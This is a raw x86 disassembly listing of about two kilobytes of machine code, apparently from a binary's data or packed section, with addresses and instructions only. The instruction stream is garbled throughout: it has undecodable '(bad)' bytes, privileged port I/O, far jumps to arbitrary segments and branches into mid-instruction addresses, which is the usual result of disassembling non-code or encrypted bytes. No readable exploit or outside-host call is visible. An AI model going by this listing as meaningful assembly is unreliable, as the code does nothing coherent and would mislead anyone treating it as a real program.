  413fbc:	or     DWORD PTR [ebp+0x5d36b810],ecx
  413fc2:	inc    esi
  413fc3:	xor    BYTE PTR [edi-0x25f305c6],al
  413fc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fca:	fsub   QWORD PTR [ecx-0x54]
  413fcd:	ds mov ecx,0x94a680c8
  413fd3:	cmp    eax,0x743abb1f
  413fd8:	in     al,0x90
  413fda:	cs pop ss
  413fdc:	mov    bp,ds
  413fdf:	inc    ecx
  413fe0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fe1:	mov    ah,0xc3
  413fe3:	fadd   QWORD PTR [esp+ecx*2+0x27]
  413fe7:	xchg   ebx,eax
  413fe8:	in     al,0x73
  413fea:	dec    ebx
  413feb:	enter  0x8a12,0xae
  413fef:	inc    ebp
  413ff0:	cs repnz push cs
  413ff3:	push   esi
  413ff4:	cs (bad) 
  413ff6:	clc    
  413ff7:	mov    bl,0x7a
  413ff9:	sub    ecx,eax
  413ffb:	ins    DWORD PTR es:[edi],dx
  413ffc:	add    al,0xdc
  413ffe:	(bad)  
  413fff:	mov    esi,0xe96b89e5
  414004:	cli    
  414005:	out    dx,eax
  414006:	jp     0x414084
  414008:	pop    esp
  414009:	sbb    esi,esi
  41400b:	xor    DWORD PTR [edi-0x3b],eax
  41400e:	and    ecx,DWORD PTR [ebx]
  414010:	push   0x74ccff3d
  414015:	inc    esp
  414016:	mov    dh,0xa5
  414018:	cmp    al,0x5d
  41401a:	fstp   QWORD PTR [ebx+0x46]
  41401d:	loope  0x41409d
  41401f:	outs   dx,BYTE PTR ds:[esi]
  414020:	xor    edx,DWORD PTR [edi+0x17]
  414023:	fdivr  DWORD PTR [ecx+0x2]
  414026:	in     eax,0x19
  414028:	fistp  WORD PTR ds:0xf55139c2
  41402e:	inc    esi
  41402f:	lods   eax,DWORD PTR ds:[esi]
  414030:	pop    ss
  414031:	loopne 0x413fe7
  414033:	jbe    0x414033
  414035:	loope  0x413fd8
  414037:	dec    ebp
  414038:	fcom   st(7)
  41403a:	adc    bl,BYTE PTR [ebp-0x5fd3576b]
  414040:	add    eax,0x671fd186
  414045:	sti    
  414046:	mov    dl,0x49
  414048:	jae    0x2863904f
  41404e:	inc    edx
  41404f:	add    al,0xea
  414051:	jnp    0x41407f
  414053:	(bad)  
  414054:	imul   BYTE PTR [eax-0x1b]
  414057:	mov    edi,0x60707e6e
  41405c:	pop    ecx
  41405d:	mov    esi,0x9a094fe4
  414062:	cmp    ebp,DWORD PTR [esi-0x1f412e6e]
  414068:	repnz dec ecx
  41406a:	stos   DWORD PTR es:[edi],eax
  41406b:	cmc    
  41406c:	test   eax,0xcf46feee
  414071:	jl     0x414006
  414073:	out    dx,al
  414074:	cmp    al,0xf9
  414076:	rcl    DWORD PTR [edi+0x695c23e6],0xa0
  41407d:	jp     0x4140ee
  41407f:	pushf  
  414080:	sub    al,0xa5
  414082:	cmp    BYTE PTR [eax],0x10
  414085:	dec    edx
  414086:	add    esi,DWORD PTR [eax]
  414088:	jnp    0x414092
  41408a:	inc    esp
  41408b:	mov    BYTE PTR [esi+0x3d0f43ac],dl
  414091:	icebp  
  414092:	pusha  
  414093:	icebp  
  414094:	js     0x414069
  414096:	push   esi
  414097:	or     esp,esi
  414099:	sub    al,0xa
  41409b:	test   al,0x43
  41409d:	jmp    0x1ddb22c1
  4140a2:	sub    DWORD PTR [edx],0xfffffff3
  4140a5:	mov    ds:0x53610b8,al
  4140aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140ab:	jge    0x414076
  4140ad:	popf   
  4140ae:	and    DWORD PTR [eax],eax
  4140b0:	mov    dl,0x9a
  4140b2:	jp     0x414054
  4140b4:	sbb    BYTE PTR [ecx-0x6597d96c],bl
  4140ba:	pop    edx
  4140bb:	pop    esp
  4140bc:	cmp    BYTE PTR [ebp+0x6556ed5],dh
  4140c2:	loope  0x4140c9
  4140c4:	imul   BYTE PTR [edi+eiz*1]
  4140c7:	xlat   BYTE PTR ds:[ebx]
  4140c8:	xlat   BYTE PTR ds:[ebx]
  4140c9:	dec    ah
  4140cb:	hlt    
  4140cc:	mov    BYTE PTR [edx],ah
  4140ce:	lods   al,BYTE PTR ds:[esi]
  4140cf:	out    dx,eax
  4140d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140d1:	dec    esp
  4140d2:	inc    esp
  4140d3:	mov    dh,0x45
  4140d5:	data16 jg 0x414093
  4140d8:	retf   0x3c5c
  4140db:	lock add al,dh
  4140de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140df:	cld    
  4140e0:	mov    eax,cs
  4140e2:	daa    
  4140e3:	lea    ebx,[esp+ebx*2]
  4140e6:	and    cl,dh
  4140e8:	mov    edx,0xaef635
  4140ed:	loopne 0x414160
  4140ef:	sub    BYTE PTR [esi+0xc],ch
  4140f2:	pushf  
  4140f3:	lahf   
  4140f4:	fdivr  DWORD PTR cs:[edi-0x2e]
  4140f8:	mov    BYTE PTR [edx+eiz*1-0x63],al
  4140fc:	cwde   
  4140fd:	inc    ecx
  4140fe:	aas    
  4140ff:	daa    
  414100:	mov    bl,0xa8
  414102:	mov    bh,0xe8
  414104:	dec    edi
  414105:	jle    0x4140e0
  414107:	ja     0x414169
  414109:	dec    edi
  41410a:	and    al,0x9a
  41410c:	sbb    ebx,DWORD PTR [edx+0x54]
  41410f:	shr    cl,1
  414111:	test   eax,0xea181334
  414116:	lock mov fs:0xd963df6a,eax
  41411d:	xor    al,0x43
  41411f:	lods   al,BYTE PTR ds:[esi]
  414120:	push   esi
  414121:	mov    cl,0x89
  414123:	jno    0x414113
  414125:	dec    ebp
  414126:	repnz ss daa 
  414129:	sbb    al,0x47
  41412b:	sbb    al,0x90
  41412d:	cdq    
  41412e:	jb     0x4140bf
  414130:	in     eax,dx
  414131:	xor    bl,BYTE PTR [eax+0xb]
  414134:	jbe    0x4140c6
  414136:	ja     0x414174
  414138:	dec    ecx
  414139:	loope  0x4140e0
  41413b:	sub    BYTE PTR [ecx+ebx*4-0x192213ac],dh
  414142:	jge    0x41415e
  414144:	(bad)  
  414145:	aam    0xa9
  414147:	jle    0x414156
  414149:	stc    
  41414a:	xor    DWORD PTR [ebp+0x44],eax
  41414d:	pusha  
  41414e:	xchg   ebp,eax
  41414f:	ss dec esi
  414151:	push   esp
  414152:	jbe    0x414197
  414154:	add    ch,ch
  414156:	adc    dl,BYTE PTR [esi-0x56]
  414159:	mov    ah,0xff
  41415b:	xchg   ebx,eax
  41415c:	outs   dx,BYTE PTR ds:[esi]
  41415d:	dec    ebp
  41415e:	cli    
  41415f:	jge    0x41416d
  414161:	add    al,0x3b
  414163:	sub    cl,BYTE PTR [edi-0x2c]
  414166:	push   cs
  414167:	push   esp
  414168:	push   eax
  414169:	clc    
  41416a:	sub    DWORD PTR [ebp-0x4b7eed3a],ecx
  414170:	or     eax,0x37f51f48
  414175:	cmp    DWORD PTR [esi],esi
  414177:	addr16 mov edx,0x1532b11b
  41417d:	push   ss
  41417e:	ja     0x414153
  414180:	sbb    DWORD PTR [edi-0x6ca88d7e],0x3dbb822e
  41418a:	jnp    0x414190
  41418c:	daa    
  41418d:	mov    edx,0x260c29e
  414192:	cmp    bl,BYTE PTR [edx+ebx*8+0x7c]
  414196:	push   ebx
  414197:	or     edx,ebp
  414199:	push   es
  41419a:	ficom  WORD PTR [ecx]
  41419c:	aad    0x61
  41419e:	mov    bh,0x58
  4141a0:	in     al,dx
  4141a1:	pop    ebp
  4141a2:	stos   BYTE PTR es:[edi],al
  4141a3:	xchg   ebx,eax
  4141a4:	cmp    esi,esp
  4141a6:	mov    ds:0x612f7a0f,al
  4141ab:	pop    esp
  4141ac:	sar    BYTE PTR [eax+0x6098da5c],1
  4141b2:	inc    ebx
  4141b3:	retf   
  4141b4:	stos   BYTE PTR es:[edi],al
  4141b5:	mov    ebp,0x3e0d186
  4141ba:	(bad)  [eax+0x3320eeae]
  4141c0:	repz sahf 
  4141c2:	sub    ah,BYTE PTR [eax+0x25]
  4141c5:	pusha  
  4141c6:	adc    DWORD PTR [esp+ebx*4],edx
  4141c9:	cmc    
  4141ca:	fcomp  QWORD PTR es:[ebp-0x3b61897c]
  4141d1:	mov    al,ds:0xb9aa9869
  4141d6:	std    
  4141d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141d8:	rcr    DWORD PTR [edx+0x54],cl
  4141db:	sub    BYTE PTR [edi],ch
  4141dd:	xor    DWORD PTR ss:[ebx+0x6f],edx
  4141e1:	(bad)  
  4141e2:	pop    ss
  4141e3:	retf   
  4141e4:	lock or BYTE PTR [edi+0x50],cl
  4141e8:	fcmovnu st,st(1)
  4141ea:	pop    ebp
  4141eb:	into   
  4141ec:	pop    eax
  4141ed:	icebp  
  4141ee:	mov    ah,0x2c
  4141f0:	enter  0xadae,0xad
  4141f4:	and    BYTE PTR [edi],dl
  4141f6:	inc    edx
  4141f7:	fisub  WORD PTR [eax+0xd31cd31]
  4141fd:	sub    esi,DWORD PTR [eax-0x32bb7b5b]
  414203:	repnz dec edx
  414205:	push   0x608e6872
  41420a:	inc    ebx
  41420b:	sti    
  41420c:	sub    BYTE PTR [ebx-0x1c],bl
  41420f:	pop    esi
  414210:	xchg   ebp,eax
  414211:	dec    esp
  414212:	ds xor eax,0x3af64845
  414218:	adc    al,0x56
  41421a:	xlat   BYTE PTR ds:[ebx]
  41421b:	test   al,0x7e
  41421d:	fwait
  41421e:	push   edi
  41421f:	or     eax,0x32bec096
  414224:	jnp    0x414273
  414226:	sub    al,0xe8
  414228:	loop   0x41421d
  41422a:	cmp    ecx,DWORD PTR [eax]
  41422c:	mov    al,ds:0x1c7cfea3
  414231:	or     edi,eax
  414233:	(bad)  
  414234:	mov    cl,0x9
  414236:	lea    ebp,[edx]
  414238:	(bad)  
  414239:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41423a:	addr16 pop ecx
  41423c:	xor    DWORD PTR [ebp-0x1978d04a],0xfffffff4
  414243:	pop    edx
  414244:	cmp    eax,0x45ec5c88
  414249:	out    0xd6,eax
  41424b:	mov    eax,0x1c977b85
  414250:	sbb    ebp,edx
  414252:	call   0x1247d3ad
  414257:	std    
  414258:	shl    esp,0x82
  41425b:	ss sub dl,ch
  41425e:	cld    
  41425f:	rcr    BYTE PTR [edx-0x13495f43],cl
  414265:	out    0x45,al
  414267:	mov    bl,0x69
  414269:	pop    ecx
  41426a:	xchg   esp,eax
  41426b:	dec    esi
  41426c:	shr    DWORD PTR [ebx+esi*2],1
  41426f:	sub    ah,ch
  414271:	sub    BYTE PTR [ebx],cl
  414273:	xlat   BYTE PTR ds:[ebx]
  414274:	ret    0xd11e
  414277:	pushf  
  414278:	daa    
  414279:	pop    es
  41427a:	cmp    al,0xc0
  41427c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41427d:	out    dx,al
  41427e:	push   ds
  41427f:	pop    ecx
  414280:	mov    ebp,DWORD PTR [edi]
  414282:	adc    al,0xbf
  414284:	call   esp
  414286:	push   ebp
  414287:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414288:	sub    ebx,edi
  41428a:	dec    esi
  41428b:	or     DWORD PTR [edi-0x76b9a77a],0xffffffcc
  414292:	jmp    0xe9c9:0xe7c7b725
  414299:	adc    BYTE PTR [eax-0x198ce7ea],al
  41429f:	js     0x4142af
  4142a1:	ret    
  4142a2:	xchg   esp,eax
  4142a3:	sti    
  4142a4:	or     eax,0x9707b34f
  4142a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142aa:	out    0x6,eax
  4142ac:	dec    esi
  4142ad:	jno    0x4142b1
  4142af:	dec    ebx
  4142b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142b1:	push   edi
  4142b2:	imul   esi,DWORD PTR [edx],0xe06b435f
  4142b8:	aaa    
  4142b9:	mov    dh,0x8d
  4142bb:	push   esi
  4142bc:	loopne 0x4142a7
  4142be:	push   0xf42a1709
  4142c3:	cmp    BYTE PTR [edx-0x3597b1a9],ch
  4142c9:	mov    ecx,0x401b5191
  4142ce:	enter  0x9bef,0xe5
  4142d2:	test   al,0x73
  4142d4:	(bad)  
  4142d5:	adc    eax,0x1d482ca9
  4142da:	enter  0x9b2f,0xc5
  4142de:	shl    DWORD PTR [eax+0x3d],cl
  4142e1:	sub    DWORD PTR [eax],esi
  4142e3:	jae    0x414318
  4142e5:	fild   DWORD PTR [eax+0x1b47301b]
  4142eb:	cmp    edi,DWORD PTR [edx-0x4bacb949]
  4142f1:	pop    ss
  4142f2:	add    DWORD PTR [esi],esp
  4142f4:	jl     0x4142b7
  4142f6:	pop    ds
  4142f7:	mov    bh,0x49
  4142f9:	dec    edx
  4142fa:	or     DWORD PTR [ebp+0x6b],0x2d
  4142fe:	inc    ebp
  4142ff:	test   esp,edi
  414301:	jbe    0x41434d
  414303:	jns    0x414343
  414305:	mul    DWORD PTR [ebx]
  414307:	or     edi,DWORD PTR [edx-0x247829b3]
  41430d:	lock xor eax,0xdd18900c
  414313:	fwait
  414314:	aad    0x55
  414316:	xor    eax,0xd0f99294
  41431b:	cmp    ebx,DWORD PTR [ebp-0x57]
  41431e:	mov    esp,0x72950423
  414323:	call   0x4e7c:0x9c586a6b
  41432a:	jmp    0x4343:0xe45ff832
  414331:	gs je  0x4142fb
  414334:	ss test al,0xb5
  414337:	adc    ebx,DWORD PTR [ecx+0x7]
  41433a:	ja     0x414386
  41433c:	fstp   QWORD PTR [edx]
  41433e:	fdiv   st,st(7)
  414340:	xchg   edx,eax
  414341:	arpl   WORD PTR [ebx],bx
  414343:	aad    0x3
  414345:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414346:	fistp  WORD PTR [ecx+0x47c8e511]
  41434c:	mov    bh,0x96
  41434e:	push   edx
  41434f:	(bad)  
  414350:	lds    ebp,FWORD PTR [esi+0x56]
  414353:	jne    0x414305
  414355:	inc    ebx
  414356:	push   ds
  414357:	mov    ecx,0xdd6d95e0
  41435c:	fimul  WORD PTR [ebp+0x2bbb8be1]
  414362:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414363:	lahf   
  414364:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414365:	adc    BYTE PTR ss:[ecx],dl
  414368:	mov    edx,0xbd033e7c
  41436d:	mov    dh,0xd
  41436f:	mov    cl,0xd3
  414371:	mov    eax,ds:0x40a9f060
  414376:	int3   
  414377:	test   al,0x9a
  414379:	aas    
  41437a:	lds    ebp,FWORD PTR [edi]
  41437c:	popf   
  41437d:	xchg   BYTE PTR [ecx],dl
  41437f:	inc    ebx
  414380:	sub    eax,0x3fc02852
  414385:	jbe    0x414345
  414387:	(bad)  
  414388:	inc    edx
  414389:	test   ebx,0xfbe94234
  41438f:	jbe    0x41438a
  414391:	xor    cl,BYTE PTR [ecx+0x68]
  414394:	sub    DWORD PTR [esi-0x4cfd6eb],ecx
  41439a:	mov    bh,0x26
  41439c:	push   0x6e
  41439e:	stos   DWORD PTR es:[edi],eax
  41439f:	push   ecx
  4143a0:	je     0x4143bd
  4143a2:	mov    dh,0x57
  4143a4:	and    BYTE PTR [esi+0x1913e59e],ch
  4143aa:	xchg   ebp,esi
  4143ac:	xor    al,0x70
  4143ae:	repnz cmps DWORD PTR ds:[si],DWORD PTR es:[di]
  4143b1:	call   0x513ad5a0
  4143b6:	cld    
  4143b7:	mov    ebx,0xa6971a73
  4143bc:	dec    edi
  4143bd:	scas   eax,DWORD PTR es:[edi]
  4143be:	dec    eax
  4143bf:	cmp    dh,dl
  4143c1:	sbb    bh,bh
  4143c3:	jb     0x4143f7
  4143c5:	js     0x41435b
  4143c7:	jno    0x41438f
  4143c9:	into   
  4143ca:	ja     0x4143b1
  4143cc:	adc    DWORD PTR [esi-0x4a],edi
  4143cf:	fistp  DWORD PTR [edi]
  4143d1:	and    dh,0x18
  4143d4:	push   ds
  4143d5:	iret   
  4143d6:	sbb    esp,edi
  4143d8:	and    eax,0xfef85ee
  4143de:	inc    ebp
  4143df:	repz loopne 0x414365
  4143e2:	loope  0x41444e
  4143e4:	dec    edi
  4143e5:	enter  0xf599,0x25
  4143e9:	iret   
  4143ea:	pusha  
  4143eb:	sub    dl,BYTE PTR [eax]
  4143ed:	aas    
  4143ee:	mov    esp,0x3d8fc868
  4143f3:	cdq    
  4143f4:	arpl   ax,bp
  4143f6:	jmp    0x1eeb674e
  4143fb:	jb     0x414428
  4143fd:	sub    bh,BYTE PTR [ecx-0x59a9b0d9]
  414403:	loop   0x41439a
  414405:	test   al,0xc5
  414407:	cmc    
  414408:	inc    ebx
  414409:	jle    0x41446b
  41440b:	jbe    0x414449
  41440d:	and    esp,edi
  41440f:	mov    al,BYTE PTR [ebx+0x72bb09f]
  414415:	loopne 0x4143fd
  414417:	xchg   ebp,eax
  414418:	pop    edx
  414419:	sti    
  41441a:	jbe    0x41443f
  41441c:	jo     0x4143ce
  41441e:	push   ebp
  41441f:	loopne 0x414478
  414421:	jecxz  0x414410
  414423:	inc    edi
  414424:	mov    cl,0xa7
  414426:	aad    0x88
  414428:	stos   DWORD PTR es:[edi],eax
  414429:	fcmovne st,st(2)
  41442b:	jae    0x414438
  41442d:	jp     0x4143b7
  41442f:	add    ebx,DWORD PTR [ebp+0x58]
  414432:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414433:	dec    BYTE PTR ds:[esp+ecx*2+0xc]
  414438:	fwait
  414439:	mov    BYTE PTR [esi],al
  41443b:	jmp    0x414410
  41443d:	jae    0x414405
  41443f:	sbb    ch,bl
  414441:	add    DWORD PTR [eax-0x37],edx
  414444:	outs   dx,DWORD PTR ds:[esi]
  414445:	push   ds
  414446:	pop    edi
  414447:	mov    ebx,0xe9497b59
  41444c:	mov    edi,0x45a3def6
  414451:	sub    BYTE PTR [edx+0x54998ff6],ch
  414457:	idiv   BYTE PTR [edi]
  414459:	cli    
  41445a:	addr16 ss push ds
  41445d:	xor    al,0xeb
  41445f:	or     ecx,DWORD PTR [eax+0x27a1de5c]
  414465:	neg    bh
  414467:	xor    eax,0x6ae3bbe3
  41446c:	mov    ebp,0x1de8d688
  414471:	sub    BYTE PTR [esi+0x5cfe74d2],bl
  414477:	ret    0x8034
  41447a:	(bad)  
  41447b:	out    dx,al
  41447c:	bound  edi,QWORD PTR [edi]
  41447e:	add    BYTE PTR [ecx+0x4a1be307],bl
  414484:	nop
  414485:	xchg   ebp,eax
  414486:	adc    eax,edx
  414488:	fs aam 0xa4
  41448b:	adc    esi,DWORD PTR [edx]
  41448d:	(bad)  
  41448f:	push   0x2e
  414491:	push   edx
  414492:	sub    DWORD PTR [ecx+0x40d25ad],esi
  414498:	ss pop ebx
  41449a:	js     0x414477
  41449c:	jle    0x4144dc
  41449e:	aam    0xe9
  4144a0:	lock mov eax,ds:0x5b74abc2
  4144a6:	fld    TBYTE PTR [ebx]
  4144a8:	xchg   BYTE PTR [ebx],cl
  4144aa:	mov    al,ds:0x6dac132c
  4144af:	fld    st(1)
  4144b1:	loopne 0x4144c2
  4144b3:	popa   
  4144b4:	ins    BYTE PTR es:[edi],dx
  4144b5:	je     0x4144f7
  4144b7:	adc    bh,BYTE PTR [ebp+0x43bdc1a]
  4144bd:	in     eax,0xac
  4144bf:	out    0xfc,al
  4144c1:	mov    edx,0xa280d9c0
  4144c6:	or     al,0xb0
  4144c8:	cmp    DWORD PTR [ebx],edx
  4144ca:	jno    0x414544
  4144cc:	test   BYTE PTR [edx+eax*2-0x10637c4a],al
  4144d3:	push   ebx
  4144d4:	(bad)  
  4144d5:	fstp   st(4)
  4144d7:	push   ebp
  4144d8:	in     al,dx
  4144d9:	xchg   esi,eax
  4144da:	ja     0x4144e9
  4144dc:	out    dx,al
  4144dd:	loop   0x4144ee
  4144df:	xchg   edi,eax
  4144e0:	xor    eax,0xc2303d2
  4144e5:	inc    eax
  4144e6:	mov    ds:0xfe354cfa,al
  4144eb:	adc    dl,BYTE PTR [edi-0x3206318b]
  4144f1:	sahf   
  4144f2:	(bad)  
  4144f3:	loope  0x414572
  4144f5:	xchg   edi,eax
  4144f6:	cmp    cl,BYTE PTR [ebx-0x42]
  4144f9:	(bad)
  4144fe:	xchg   edx,eax
  4144ff:	cld    
  414500:	jecxz  0x4144cb
  414502:	or     eax,0xb1023939
  414507:	dec    ebx
  414508:	xor    esi,edx
  41450a:	enter  0x42d2,0xba
  41450e:	or     al,0xa0
  414510:	dec    esi
  414511:	add    eax,0x23fe8be3
  414516:	push   esi
  414517:	lods   al,BYTE PTR ds:[esi]
  414518:	jb     0x414515
  41451a:	imul   eax,DWORD PTR [ecx],0xffffff86
  41451d:	sub    eax,0xbe24779c
  414522:	jbe    0x414588
  414524:	jmp    0xd17:0x9f9cc2d5
  41452b:	sahf   
  41452c:	lods   eax,DWORD PTR ds:[esi]
  41452d:	cmp    ebx,DWORD PTR ss:[ecx]
  414530:	add    al,0x11
  414532:	aad    0x7c
  414534:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414535:	push   ds
  414536:	std    
  414537:	int    0x7c
  414539:	inc    esp
  41453a:	test   eax,0x526dc3db
  41453f:	inc    eax
  414540:	push   cs
  414541:	push   0x83c15262
  414546:	jnp    0x414552
  414548:	std    
  414549:	cld    
  41454a:	fisttp DWORD PTR [ebx]
  41454c:	scas   eax,DWORD PTR es:[edi]
  41454d:	call   0xc535:0x4dc2e7d7
  414554:	mov    bl,dh
  414556:	imul   esp,ebx,0x69
  414559:	(bad)
  41455c:	mov    WORD PTR [ebp-0x6],?
  41455f:	xor    eax,0x9567b079
  414564:	xor    ch,0xc6
  414567:	push   ebp
  414568:	jae    0x41453e
  41456a:	cli    
  41456b:	dec    eax
  41456c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41456d:	xchg   ebp,eax
  41456e:	sub    al,0x81
  414570:	pop    edx
  414571:	jmp    0xcef76c7d
  414576:	icebp  
  414577:	dec    esi
  414578:	push   0xffffffe6
  41457a:	xchg   BYTE PTR [ebx-0x16],dh
  41457d:	mov    al,0x78
  41457f:	and    ecx,ebx
  414581:	mov    dh,0x2
  414583:	mov    al,ds:0x489b5531
  414588:	dec    edi
  414589:	adc    bh,BYTE PTR [edx-0x10]
  41458c:	cmc    
  41458d:	(bad)  
  41458e:	lahf   
  41458f:	inc    ebx
  414590:	fisub  DWORD PTR [edx+0x3bba5beb]
  414596:	and    BYTE PTR [edx-0x16],cl
  414599:	push   es
  41459a:	nop
  41459b:	ins    DWORD PTR es:[edi],dx
  41459c:	add    al,0x6a
  41459e:	lods   eax,DWORD PTR ds:[esi]
  41459f:	int    0x12
  4145a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145a2:	mov    ch,0xb9
  4145a4:	or     dh,BYTE PTR [ebp-0x38cfd889]
  4145aa:	and    DWORD PTR [edi+0x74],ebp
  4145ad:	lods   eax,DWORD PTR ds:[esi]
  4145ae:	ins    DWORD PTR es:[edi],dx
  4145af:	ds out 0xba,eax
  4145b2:	aas    
  4145b3:	pusha  
  4145b4:	pushf  
  4145b5:	or     eax,0x37b21a1c
  4145ba:	ret    
  4145bb:	in     al,0xa2
  4145bd:	and    bl,bh
  4145bf:	xor    bh,BYTE PTR [edi]
  4145c1:	jmp    0x41454f
  4145c3:	mov    ds,WORD PTR fs:[esi+0x1f3d650d]
  4145ca:	(bad)  
  4145cb:	in     al,0x93
  4145cd:	and    BYTE PTR [esi-0x4fc32e47],bh
  4145d3:	or     DWORD PTR [ecx+0x581cda2f],edi
  4145d9:	test   al,0x3c
  4145db:	call   0x73983852
  4145e0:	pop    es
  4145e1:	pop    ebp
  4145e2:	dec    eax
  4145e3:	jbe    0x414583
  4145e5:	pop    eax
  4145e6:	jno    0x41457c
  4145e8:	inc    esi
  4145e9:	mov    ecx,DWORD PTR [edx-0x2fc9c369]
  4145ef:	push   cs
  4145f0:	je     0x41458c
  4145f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145f3:	outs   dx,BYTE PTR ds:[esi]
  4145f4:	xchg   BYTE PTR [esi-0x48],al
  4145f7:	or     cl,BYTE PTR [eax]
  4145f9:	add    eax,0xb4c8c54e
  4145fe:	jmp    0x213d4fba
  414603:	jb     0x414648
  414605:	hlt    
  414606:	loope  0x4145b8
  414608:	push   ss
  414609:	mov    al,0x1f
  41460b:	mov    al,ds:0x6b82ca27
  414610:	fmul   st(6),st
  414612:	inc    esi
  414613:	dec    eax
  414614:	jg     0x41460c
  414616:	fsubr  DWORD PTR [esi+0x67]
  414619:	xchg   esi,esi
  41461b:	push   edi
  41461c:	jns    0x41463d
  41461e:	test   DWORD PTR [eax-0x1c62b2ce],ebx
  414624:	repnz push ecx
  414626:	pop    esi
  414627:	xor    BYTE PTR [ebp-0x726a4cbf],al
  41462d:	push   esp
  41462e:	push   ebx
  41462f:	mov    ebx,0x86b5c909
  414634:	iret   
  414635:	jbe    0x4145c3
  414637:	push   esp
  414638:	mov    dh,0x47
  41463a:	xor    edi,ebx
  41463c:	mov    al,0x53
  41463e:	retf   0x13b
  414641:	(bad)  
  414642:	fld    QWORD PTR [ecx+0x3aae4d90]
  414648:	sub    al,0xf8
  41464a:	pop    ss
  41464b:	scas   al,BYTE PTR es:[edi]
  41464c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41464d:	mov    bl,0x62
  41464f:	nop
  414650:	dec    edx
  414651:	pop    edi
  414652:	ror    eax,cl
  414654:	xchg   esp,eax
  414655:	cmp    ah,bl
  414657:	add    DWORD PTR [ebx],0xd8279795
  41465d:	test   BYTE PTR [ebx+eax*8],dh
  414660:	adc    edi,ebp
  414662:	outs   dx,DWORD PTR ds:[esi]
  414663:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414664:	popa   
  414665:	push   edi
  414666:	push   edi
  414667:	mov    dl,0xdf
  414669:	xlat   BYTE PTR ds:[ebx]
  41466a:	fdiv   st(4),st
  41466c:	add    dh,0xbf
  41466f:	in     eax,0xf2
  414671:	mov    ds:0x1bf6b189,al
  414676:	int    0x6e
  414678:	out    dx,eax
  414679:	fcom   st(1)
  41467b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41467c:	sub    al,bl
  41467e:	bswap  esi
  414680:	fisttp WORD PTR [edi-0x3526c10a]
  414686:	mov    ah,0xe3
  414688:	mov    dh,0x75
  41468a:	pop    ebx
  41468b:	xchg   ecx,eax
  41468c:	jae    0x41463c
  41468e:	pop    eax
  41468f:	lods   eax,DWORD PTR ds:[esi]
  414690:	xchg   edx,eax
  414691:	and    eax,0x3852eec7
  414696:	sbb    edx,ecx
  414698:	iret   
  414699:	imul   ecx,DWORD PTR [ebx+0x7c],0x7b
  41469d:	bound  ebp,QWORD PTR [edi+0x64bd03ff]
  4146a3:	popf   
  4146a4:	sub    ebx,DWORD PTR [ebp-0xe98ff2d]
  4146aa:	and    dl,BYTE PTR ds:0x2d7e346c
  4146b0:	std    
  4146b1:	leave  
  4146b2:	cli    
  4146b3:	into   
  4146b4:	ss jbe 0x41463a
  4146b7:	les    ecx,FWORD PTR [edx+0x75]
  4146ba:	jmp    0x4874:0x5847dcb0
  4146c1:	lea    edi,[ecx+0x73956348]
  4146c7:	das    
  4146c8:	ss mov dh,0x5f
  4146cb:	xchg   BYTE PTR [ecx+0x14ec3129],dh
  4146d1:	inc    ebp
  4146d2:	xor    DWORD PTR [esi+0x18],ebp
  4146d5:	mov    bl,0x2c
  4146d7:	mov    ebp,0xac8e5c9d
  4146dc:	jne    0x4146de
  4146de:	inc    edx
  4146df:	daa    
  4146e0:	(bad)  
  4146e1:	lods   al,BYTE PTR ds:[esi]
  4146e2:	dec    edx
  4146e3:	rcl    DWORD PTR [esi+0x240d4b],cl
  4146e9:	push   edi
  4146ea:	into   
  4146eb:	mov    ebp,ebp
  4146ed:	mov    dl,0x2c
  4146ef:	shl    DWORD PTR [edi+edi*8+0x7d],cl
  4146f3:	mov    DWORD PTR [edx],esi
  4146f5:	inc    ecx
  4146f6:	mov    esi,0x7e40a33
  4146fb:	retf   0x93b5
  4146fe:	xor    dl,cl
  414700:	inc    eax
  414701:	sbb    DWORD PTR [esi-0x12],edx
  414704:	sub    eax,0x7817bd18
  414709:	mov    edi,0xdcc9ecf2
  41470e:	popa   
  41470f:	inc    eax
  414710:	jb     0x4146c6
  414712:	clc    
  414713:	mov    dh,ch
  414715:	xchg   ebx,eax
  414716:	aad    0xf8
  414718:	in     eax,dx
  414719:	push   0x21
  41471b:	cli    
  41471c:	int3   
  41471d:	or     esp,ebp
  41471f:	xchg   esp,eax
  414720:	cmove  esi,DWORD PTR [esi-0x26]
  414724:	aas    
  414725:	mov    eax,DWORD PTR ds:0xa4f78cf7
  41472b:	ret    
  41472c:	imul   ebp,DWORD PTR [ecx],0x52
  41472f:	mov    al,0xe8
  414731:	pop    edx
  414732:	shl    BYTE PTR [ecx+0x112e10ac],cl
  414738:	rol    esp,cl
  41473a:	sbb    BYTE PTR [ebp-0x19],cl
  41473d:	call   0x2be9b55a
  414742:	popa   
  414743:	inc    esp
  414744:	mov    ecx,0x6646877b
  414749:	fild   WORD PTR [esi]
  41474b:	and    al,0xde
  41474d:	aaa    
  41474e:	pop    edx
  41474f:	ins    BYTE PTR es:[edi],dx
  414750:	sub    eax,0xbcbd6559
  414755:	and    al,0xc1
  414757:	pusha  
  414758:	inc    edx
  414759:	pop    ecx
  41475a:	pop    ebp
  41475b:	jp     0x41478d
  41475d:	shr    eax,0xa8
  414760:	scas   al,BYTE PTR es:[edi]
  414761:	std    
  414762:	fld    st(6)
